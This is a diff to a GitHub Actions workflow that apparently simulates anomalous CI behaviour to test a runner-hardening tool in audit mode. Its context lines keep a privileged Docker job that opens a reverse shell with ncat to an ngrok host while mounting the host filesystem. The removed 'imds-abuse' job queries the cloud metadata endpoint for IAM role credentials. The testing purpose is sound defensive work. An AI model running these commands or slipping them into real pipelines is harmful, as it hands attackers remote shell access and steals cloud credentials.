@@ -130,20 +130,6 @@ jobs:
         run: |
           docker run --privileged --cap-add=ALL -v /:/host raesene/ncat:latest 0.tcp.us-cal-1.ngrok.io 17658 -e /bin/bash
 
-  imds-abuse:
-    if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
-    steps:
-      - uses: step-security/harden-runner@rc-20-int
-        with:
-          egress-policy: audit
-      - name: Checkout code
-        uses: actions/checkout@v3
-      - run: |
-          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true
-          ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE || true
-
   handle-private-key:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
     runs-on: ubuntu-latest
